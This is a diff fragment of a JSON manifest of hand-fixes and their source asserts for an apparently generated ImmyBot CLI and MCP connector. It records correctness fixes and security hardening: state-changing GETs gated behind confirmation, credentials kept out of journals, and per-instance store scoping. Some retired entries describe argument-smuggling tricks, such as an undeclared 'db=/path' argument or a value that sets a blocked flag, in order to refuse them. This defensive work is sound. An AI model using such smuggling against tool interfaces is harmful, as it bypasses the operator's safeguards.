+     "file": "cli/internal/cli/immybot_credential_tier_test.go",
+     "contains": "func TestCredentialTierReachesNoSinkButTheTerminal(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "_ = os.RemoveAll(filepath.Join(dir, \"http\"))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "cacheDir = filepath.Join(dir, \"http-2\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/immybot_redirect_class_test.go",
+     "contains": "func TestACachedAnswerFromAPriorBinaryIsNeverServed(",
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "computer-row-read-by-its-schema",
+   "class": "wrong-result",
+   "summary": "every novel reads a computer's id, name, tenant and flags through one reader keyed by the mirrored resource's own schema (computers, computers-paged, dx, onboarding, inventory, actions, ...), and counts computers and tenants by id",
+   "why": "assignment-explain, computer-dossier, psa-reconcile and fleet-diff read name/tenant/online from computers-paged rows, whose ComputerListViewModel fields are computerName/tenantName/isOnline, so a paged computer was not found and its changes were invisible; version-spread counted every machine with a title as behind; session-triage counted computers and tenants by name. One shape table (immyComputerShapes) and id-keyed counts fix the class. fleet-diff then fingerprinted each roster resource row under one key, so the last resource read overwrote the other: GET /api/v1/computers (ComputerSearch.online, boolean) and /computers/paged (ComputerListViewModel.isOnline, nullable) are both default-synced for every machine, and a null hid a machine going offline. Every roster read now goes through the merged immyLoadComputers record, and a source-scan test refuses a command that selects roster rows itself. The merged record then let the first source that carried a value win, so a later sync of one source (sync --resources computers-paged saying isOnline:false) could not replace an older value another source left, in fleet-diff and computer-dossier alike. Each field now comes from the newest-synced row that carries it (a null still never hides a value), and the fleet-diff fingerprint also carries every source value that disagrees with the merged record, so a change in any one source is a change even when two syncs land in the same second. A row with no computer id (GetMaintenanceActionResponse.computerId is nullable) joined a computer by name, so computer 42 RECEPTION in one tenant took the action another tenant's RECEPTION ran, and a Computer rule whose target was that name reached both; a uniqueness check over the roster still missed names that only software or action rows carry. Rows now join a computer by computer id only (immyComputerJoinFor binds the id alone), a Computer rule reaches its computer by id only, and computer-dossier counts the rows with no computer id in unidentified_actions and unidentified_software. A source-scan test refuses a SQL comparison of a mirrored computer name or a join built from a shape's name field.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/immybot_computer_row.go",
+     "contains": "func immyComputerSelect(resourceType string) string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_diff.go",
+     "contains": "func collectFleetComputers(ctx context.Context, db *store.Store, kind string, resourceTypes []string, out map[string]store.ImmyFleetRow) (int, error) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/session_triage.go",
+     "contains": "computerKey: immyComputerCountKey(nullStr(computerID), len(scanned)),",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/immybot_computer_row_test.go",
+     "contains": "func TestAssignmentExplainResolvesPagedComputer(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/immybot_computer_row_test.go",
+     "contains": "func TestPsaReconcileReadsPagedComputerRows(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/immybot_computer_row_test.go",
+     "contains": "func TestComputerDossierReadsEveryComputerShape(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/immybot_count_fields_test.go",
+     "contains": "func TestVersionSpreadTenantBehindCountsComputersBelowFloor(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/immybot_fleet_computer_row_test.go",
+     "contains": "func TestFleetStateReadsEachComputerShape(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/immybot_triage_identity_test.go",
+     "contains": "func TestSessionTriageCountsComputersAndTenantsByID(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/fleet_diff.go",
+     "contains": "roster, err := immyLoadComputers(ctx, db, resourceTypes)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_diff.go",
+     "not_contains": "immyComputerSelect(rt)"
+    },
+    {
+     "file": "cli/internal/cli/immybot_fleet_roster_merge_test.go",
+     "contains": "func TestFleetDiffSeesAComputerGoOfflineWhenAnotherSourceIsNull(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/immybot_roster_single_reader_test.go",
+     "contains": "func TestRosterRowsAreReadOnlyThroughTheMergedLoader(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/immybot_computer_row.go",
+     "contains": "COALESCE(julianday(synced_at), 0) FROM resources WHERE resource_type = ? ORDER BY id",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/immybot_computer_row.go",
+     "contains": "sort.SliceStable(fresh, func(i, j int) bool { return fresh[i].at > fresh[j].at })",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_diff.go",
+     "contains": "for _, s := range roster.sources(c.ID) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_diff.go",
+     "contains": "\"computer-roster:source-disagreements\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/immybot_roster_newest_sync_test.go",
+     "contains": "func TestFleetDiffSeesAPagedOnlySyncChangeTheMachine(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/immybot_roster_newest_sync_test.go",
+     "contains": "func TestFleetDiffNewSourceChangesOnlyWhenItDisagrees(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/immybot_roster_newest_sync_test.go",
+     "contains": "func TestComputerDossierShowsTheNewestSyncedSource(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/immybot_computer_row.go",
+     "contains": "func immyComputerJoinFor(resourceType, computerID string) (string, []any) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/immybot_computer_row.go",
+     "contains": "func immyComputerNoID(resourceType string) string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/immybot_computer_row.go",
+     "not_contains": "soleName"
+    },
+    {
+     "file": "cli/internal/cli/assignment_explain.go",
+     "contains": "if aTarget != \"\" && aTarget == computerID {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/immybot_computer_dossier.go",
+     "contains": "immyComputerNoID(\"maintenance-actions\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/immybot_identity_by_id_test.go",
+     "contains": "func TestComputerDossierJoinsRowsByComputerIDOnly(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/immybot_identity_by_id_test.go",
+     "contains": "func TestAssignmentExplainComputerRuleMatchesByIDOnly(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/immybot_identity_guard_test.go",
+     "contains": "func TestComputerRowsJoinByIDOnly(",
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "undated-row-never-passes-a-time-filter",
+   "class": "wrong-result",
+   "summary": "a row whose documented date fields are absent or unreadable never passes --since/--older-than and is counted as undated instead of dropped or bucketed as young",
+   "why": "onboarding-stalled counted a computer with no GetOnboardingComputerResponse.updatedDate as older than any threshold, and session-triage --since let a 30-day-old action with no startTime/endTime into the recent clusters. One helper reads each schema's dates in a stated order (actions: endTime, startTime, updatedDateUTC, createdDateUTC) and fails closed.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/immybot_time_filter.go",
+     "contains": "var immyActionTimeFields = []string{\"endTime\", \"startTime\", \"updatedDateUTC\", \"createdDateUTC\"}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/immybot_time_filter.go",
+     "contains": "func immyParseTimestamp(raw string) (time.Time, bool) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/immybot_time_filter_test.go",
+     "contains": "func TestOnboardingStalledUndatedRowNeverPassesOlderThan(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/immybot_time_filter_test.go",
+     "contains": "func TestSessionTriageUndatedActionNeverPassesSince(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/immybot_time_filter_test.go",
+     "contains": "func TestFleetDiffUndatedSnapshotNeverMeetsSince(",
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "tests-sandbox-home-and-userprofile",
+   "class": "test-determinism",
+   "summary": "hand tests that redirect the home directory go through the press sandbox (HOME and USERPROFILE, every directory resolver checked), never HOME alone",
+   "why": "On Windows os.UserHomeDir reads USERPROFILE, so a test that set only HOME resolved the runner's real profile; 4.34.0 keeps tokens in a credentials file under the data dir, so a snapshot of the temp HOME saw nothing and the stray file broke tests in other packages (ninjaone #468, 2026-10-27).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/config/config_noconfigwrite_test.go",
+     "not_contains": "t.Setenv(\"HOME\""
+    },
+    {
+     "file": "cli/internal/cli/workflow_archive_outcome_test.go",
+     "not_contains": "t.Setenv(\"HOME\""
+    },
+    {
+     "file": "cli/internal/mcp/mcp_config_resolution_test.go",
+     "not_contains": "t.Setenv(\"HOME\""
+    },
+    {
+     "file": "cli/internal/mcp/request_contract_test.go",
+     "not_contains": "t.Setenv(\"HOME\""
+    },
+    {
+     "file": "cli/internal/config/config_noconfigwrite_test.go",
+     "contains": "return testenv.Isolate(t, cliutil.ConfigDir, cliutil.DataDir, cliutil.StateDir, cliutil.CacheDir)",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "store-scope-names-the-instance",
+   "class": "wrong-result",
+   "summary": "every local store key names the ImmyBot instance, whatever signs in: the press's stable identity (or the token, or nothing when logged out) with the base URL resolved through the template variables, set through the press's config.StoreScopeIdentity seam; a store kept from before the instance key (data.db, or one named by the credential alone) is never adopted or claimed; a config that fails to load, whose instance is unknown, gets a store of its own and never the unscoped data.db",
+   "why": "The base URL is the template https://{subdomain}.immy.bot (spec.json servers[0].variables.subdomain), and the press's stable store key hashes that literal template, so two instances signed in with one Entra app registration shared one mirror and IMMYBOT_SUBDOMAIN=beta answered with alpha's computers. internal/cli/immybot_store_scope.go sets config.StoreScopeIdentity to the same identity (client id, secret, refresh token, tenant id) plus the resolved instance; A token-only login and a logged-out CLI are keyed by the instance too (next-batch review round 1: a token-only config under IMMYBOT_SUBDOMAIN=beta answered with alpha's computers through the press's legacy key), and helpers.go neither adopts the legacy credential-only key nor claims an existing data.db, because whose instance either holds is unknown. The press's MCP path tests (tools_test.go) assert data.db for a logged-out store and are edited to the scoped name. The response cache already keys on the subdomain.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "if StoreScopeIdentity != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/immybot_store_scope.go",
+     "contains": "func init() { config.StoreScopeIdentity = immyStoreScopeIdentity }",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/immybot_store_scope.go",
+     "contains": "client.ResolvedBaseURL(c.BaseURL, c.TemplateVars)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/immybot_store_scope_test.go",
+     "contains": "func TestStoreScopeNamesTheInstance(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/immybot_store_scope.go",
+     "contains": "var immyStoreNeverClaims = true",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/immybot_store_scope.go",
+     "contains": "return strings.Join(append([]string{\"instance=\" + base}, identity...), \"\\n\")",
      "min_count": 1,
      "code_only": true
     },
     {
      "file": "cli/internal/cli/helpers.go",
-     "contains": "funnelShownError(err),",
+     "contains": "setDefaultDBScopeIdentity(cfg.StoreScopeCredential(), \"\", cfg.BaseURL)",
      "min_count": 1,
      "code_only": true
     },
     {
      "file": "cli/internal/cli/helpers.go",
-     "not_contains": "\"error\": err.Error(),"
+     "contains": "if immyStoreNeverClaims {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/immybot_store_scope_test.go",
+     "contains": "func TestEveryStoreKeyNamesTheInstance(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/mcp/tools_test.go",
+     "contains": "base == \"data.db\" {",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools_test.go",
+     "contains": "if got == legacy {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools_test.go",
+     "contains": "\"No local data store found\", \".db\"}",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "if scopeHash == \"\" && immyStoreNeverClaims {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/immybot_store_scope.go",
+     "contains": "const immyUnknownInstanceScope = \"instance=unknown\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/immybot_store_unknown_test.go",
+     "contains": "func TestAnUnknownInstanceNeverGetsTheUnscopedStore(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/cmd/immybot-mcp/store_instance_e2e_test.go",
+     "contains": "func TestAConfigThatFailsToLoadReadsNoInstancesMirror(",
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "instance-fixed-before-the-store-opens",
+   "class": "wrong-result",
+   "summary": "sync --path-context refuses every server-URL variable (subdomain, and any placeholder the configured base URL carries), so the instance config and environment fix before the store opens is the one every request uses",
+   "why": "root.go keys the local store on the configured instance (store-scope-names-the-instance), then sync merged --path-context into Config.TemplateVars, so `IMMYBOT_SUBDOMAIN=alpha sync --path-context subdomain=beta` sent requests to beta and wrote beta's computers into alpha's mirror (spec.json servers[0].variables.subdomain). internal/cli/immybot_instance_vars.go refuses every key in endpointTemplateVarSet or in the base URL's placeholders as a usage error before any request or store write. The MCP sync tool shells out to the CLI, so it is refused the same way.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "if err := immyRefuseServerURLVars(pathContext, baseURL); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/immybot_instance_vars.go",
+     "contains": "func immyRefuseServerURLVars(pathContext map[string]string, baseURL string) error {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/immybot_instance_vars_test.go",
+     "contains": "func TestSyncRefusesAServerURLVariableFromPathContext(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/immybot_instance_vars_test.go",
+     "contains": "func TestServerURLVariablesAreNeverPathContext(",
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "mutating-gets-are-writes",
+   "class": "mcp-write-without-confirm",
+   "status": "active",
+   "summary": "the ImmyBot GETs that change state, or whose undocumented response leaves it open (cancel a maintenance session or a schedule's sessions, the maintenance-email reboot-now, run-now and postpone links, launch an ephemeral agent, sign in, refresh and sign out, the inbound webhook, an ephemeral agent session, a started language service and the provider plugin passthrough), are one declared list in cliutil, and every surface treats them as writes: immybot_read refuses them, immybot_execute runs them only with confirm, the MCP read-only switch refuses them, the client never answers them from or writes them to the response cache, and the CLI never answers them from or files them in the local store; a redirect never reaches one (both CheckRedirects refuse), and every spelling of a path is cleaned before it is matched",
+   "why": "The press marks a GET mutating only from its last path word, so these spec.json paths were plain reads: immybot_read ran getCancelForScheduleByScheduleId (spec.json paths[\"/api/v1/maintenance-sessions/cancel-for-schedule/{scheduleId}\"].get) with no confirm and under IMMYBOT_MCP_READ_ONLY=1 (next-batch review round 1). TestEveryGETIsClassified requires every GET endpoint to be declared mutating or named as a reviewed read (by its name and its 200 schema; an undocumented response with an action name fails closed), so a reprint or a spec refresh that adds a GET fails until someone decides which it is. A word list missed postpone, launch, login and logout, so the classification is complete rather than keyed on words.",
+   "spec_encode_followup": "cli-printing-press should mark a GET mutating from any action word in its path or from an x-mutating extension, so a connector never declares the list by hand.",
+   "asserts": [
+    {
+     "file": "cli/internal/cliutil/immybot_mutating_gets.go",
+     "contains": "func IsMutatingGETPath(raw string) bool {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/immybot_mutating_gets.go",
+     "contains": "\"/api/v1/maintenance-sessions/cancel-for-schedule/{scheduleId}\",",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/immybot_mutating_gets.go",
+     "contains": "ep.Mutating, ep.NeedsConfirm = true, true",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "if cliutil.IsMutatingGETPath(path) {",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "return c.GetMutatingWithHeaders(ctx, path, params, headers)",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/data_source.go",
+     "contains": "if cliutil.IsMutatingGETPath(path) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/immybot_mutating_gets_test.go",
+     "contains": "func TestEveryGETIsClassified(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/mcp/immybot_mutating_gets_test.go",
+     "contains": "func TestAMutatingGETNeverRunsWithoutConfirm(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/client/immybot_outbound_test.go",
+     "contains": "func TestAMutatingGETIsNeverAnsweredFromTheCache(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/immybot_mutating_gets_test.go",
+     "contains": "func TestAMutatingGETIsNeverAnsweredLocally(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cliutil/immybot_mutating_gets.go",
+     "contains": "\"/plugins/api/v1/{providerLinkId}/{catchAll}\",",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/immybot_mutating_gets.go",
+     "contains": "want[last] == \"{catchAll}\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/immybot_mutating_gets_test.go",
+     "contains": "func TestAMutatingGETPathMatchesEveryConcreteForm(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/mcp/immybot_mutating_gets.go",
+     "contains": "(m == \"GET\" || m == \"HEAD\") && cliutil.IsMutatingGETPath(ep.Path)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "if err := cliutil.MutatingGETRedirectError(req.URL.Path); err != nil {",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/immybot_mutating_gets.go",
+     "contains": "func MutatingGETRedirectError(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/immybot_mutating_gets.go",
+     "contains": "path.Clean(\"/\"+raw)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/immybot_redirect_class_test.go",
+     "contains": "func TestARedirectNeverReachesAMutatingGET(",
+     "min_count": 1
     }
    ]
   },
@@ -1341,6 +2303,153 @@
      "not_contains": "connects only to remote"
     }
    ]
+  },
+  {
+   "id": "journal-credential-hardening",
+   "class": "secret-persisted",
+   "status": "active",
+   "summary": "The learn journal keeps no text the operator typed in place of a declared name: the IMMYBOT_LEARN_SESSION override is stored as \"o:\" plus the same 64-bit SHA-256 hash (hashHarnessSession) the harness session ids get under \"h:\", so a session still groups; argv_shape records only flag names the invoked command declares under exactly the typed name, every other name as the \"<undeclared>\" placeholder (redacted), and nothing after \"--\"; failed_flag is never kept as typed (\"--<undeclared>\" when Cobra matched it to a declared flag, otherwise dropped); teach.log's missing --query lines record argument counts. Operator-named text that repeats a held credential (a teach query, a recall operand, a profile's name, a feedback note, a learn session label) is refused at the sink by the shared credential kit (credkit.AppendFile, WriteFile and the credsql driver), which this connector routes every file and SQLite write through (credkit-wiring). cmd/immybot-mcp/journal_credential_e2e_test.go drives each path on the built binary, not held and held, and fails if the credential reaches any file under the run's home.",
+   "why": "Press 4.34.0 (learn/journal.go.tmpl) returns the override raw from JournalSessionKey, so a credential set there is written to journal-*.jsonl on every command, version included, and records every typed flag name, so a credential typed as a flag name (or after --) becomes an argv_shape key and the failed_flag; teach.log records the raw arguments of a teach or playbook amend with no --query. Known limits: a guessable override can be confirmed by hashing guesses (the same bound the harness ids have); entries an older build wrote stay until the 14-day retention deletes their segment. A reprint that drops these edits fails these asserts and TestTheLearnJournalKeepsNoCredential.",
+   "spec_encode_followup": "Press-side: learn/journal.go.tmpl should hash the LEARN_SESSION override as it hashes harness ids, and JournalArgvShape should take the invoked command's declared-flag lookup, record any other name as a placeholder and stop at \"--\"; the failed flag should be the placeholder too, and teach.log should not echo raw arguments.",
+   "asserts": [
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "func hashHarnessSession(v string) string {\n\tsum := sha256.Sum256([]byte(v))\n\treturn hex.EncodeToString(sum[:8])\n}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "return \"o:\" + hashHarnessSession(v)\n\t}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "not_contains": "journalSessionEnvVar)); v != \"\" {\n\t\treturn v\n"
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "const journalUndeclaredFlag = \"<undeclared>\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "func JournalArgvShape(args []string, isBoolFlag, isDeclared func(name string) bool) map[string]string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "if tok == \"--\" {\n\t\t\tbreak\n\t\t}\n\t\tif !strings.HasPrefix(tok, \"-\") || tok == \"-\" {\n\t\t\tcontinue\n\t\t}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "if isDeclared == nil || !isDeclared(name) {\n\t\t\tshape[journalUndeclaredFlag] = journalClassRedacted\n\t\t\tcontinue\n\t\t}\n\t\tswitch {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "if entry.FailedFlag != \"\" && entry.SuggestedFlag != \"\" {\n\t\tentry.FailedFlag = \"--\" + journalUndeclaredFlag\n\t} else {\n\t\tentry.FailedFlag = \"\"\n\t}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "credkit.AppendFile(p, append(line, '\\n'), 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "lookupFlag := func(name string) *pflag.Flag {\n\t\tf := target.Flags().Lookup(name)\n\t\tif f == nil {\n\t\t\tf = target.InheritedFlags().Lookup(name)\n\t\t}\n\t\tif f == nil && len(name) == 1 {\n\t\t\tf = target.Flags().ShorthandLookup(name)\n\t\t}\n\t\treturn f\n\t}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "isDeclaredFlag := func(name string) bool {\n\t\tf := lookupFlag(name)\n\t\treturn f != nil && (f.Name == name || f.Shorthand == name)\n\t}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "learn.JournalArgvShape(os.Args[1:], isBoolFlag, isDeclaredFlag)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "learn.JournalArgvShape(os.Args[1:], isBoolFlag)"
+    },
+    {
+     "file": "cli/internal/cli/teach.go",
+     "contains": "writeTeachErrLog(fmt.Sprintf(\"teach: missing --query (%d args, %d resources)\", len(args), len(resources)))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teach.go",
+     "not_contains": "args=%v"
+    },
+    {
+     "file": "cli/internal/cli/teach_playbook.go",
+     "contains": "writeTeachErrLog(fmt.Sprintf(\"playbook amend: missing --query (%d args)\", len(args)))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teach_playbook.go",
+     "not_contains": "args=%v"
+    },
+    {
+     "file": "cli/internal/learn/journal_test.go",
+     "contains": "entries[0].SessionKey != \"o:93da339544719ff4\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal_test.go",
+     "not_contains": "entries[0].SessionKey != \"session-abc123\""
+    },
+    {
+     "file": "cli/internal/learn/journal_test.go",
+     "contains": "got := learn.JournalArgvShape(tc.args, lookup, declared)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/immybot-mcp/journal_credential_e2e_test.go",
+     "contains": "func TestTheLearnJournalKeepsNoCredential(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  }
+ ],
+ "retired": [
+  {
+   "id": "mcp-filesystem-destination-gate",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0 builds a per-command blocked set (blockedDestinationFlags, blockedInputFlags, root control-plane flags), removes those flags from each tool's schema, refuses any undeclared argument name (so \"db=/path\" is refused) and skips '=' names in cliArgsFromMCP."
+  },
+  {
+   "id": "mcp-argv-value-joined",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #4647: every value-carrying branch of cliArgsFromMCP joins the value to its flag (--k=v, one element per list item), and the press generates TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag."
+  },
+  {
+   "id": "mcp-recipe-argv-not-flag-like",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #5045 (4.33.6): a recipe positional that looks like a flag is placed after --, so it cannot set another flag."
+  },
+  {
+   "id": "windows-sddl-alias-sid-compare",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #5041 (4.33.6): trustees are resolved to SIDs (LA through the OS) and compared by SID; the press generates the alias tests."
+  },
+  {
+   "id": "windows-null-dacl-behind-flags",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #5041 (4.33.6): the DACL section's flags and ACE list are framed (daclFlagsRe, aceListRe), so a NULL DACL behind flags is refused."
+  },
+  {
+   "id": "interim-http-security-note-2026-10-22",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: The note paused HTTP mode until a reprint because the build served HTTP with no token. Press 4.34.0 HTTP mode refuses to start without <PREFIX>_MCP_HTTP_TOKEN, answers 401 without the right bearer, binds 127.0.0.1 by default and refuses a non-loopback address without TLS; onboard.py now writes HTTP guidance that follows the binary (cc-skills #14) and never writes this note, so the entry would fail on every re-onboard."
+  },
+  {
+   "id": "mcp-file-flags-refused",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0's cobratree mirror derives one blocked set per command (destination, input, mcp:write-flags, mcp:read-flags and root control-plane flags), leaves those flags out of the tool schema and refuses them, and any undeclared argument, by name."
   }
  ]
 }
